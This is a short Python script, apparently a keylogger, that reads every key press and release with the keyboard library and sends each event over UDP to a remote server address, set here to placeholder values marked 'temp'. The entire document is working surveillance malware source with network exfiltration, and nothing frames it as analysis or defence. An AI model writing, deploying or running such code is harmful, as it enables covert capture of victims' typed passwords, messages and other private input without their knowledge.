import socket
import keyboard

def send_keystrokes(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (server_ip, server_port)

    while True:
        key_event = keyboard.read_event()
        key_data = f"Key {key_event.name} {'pressed' if key_event.event_type == 'down' else 'released'}"
        client_socket.sendto(key_data.encode('utf-8'), server_address)

if __name__ == "__main__":
    SERVER_IP = '0.0.0.0'   #temp
    SERVER_PORT = 9999      #temp

    send_keystrokes(SERVER_IP, SERVER_PORT)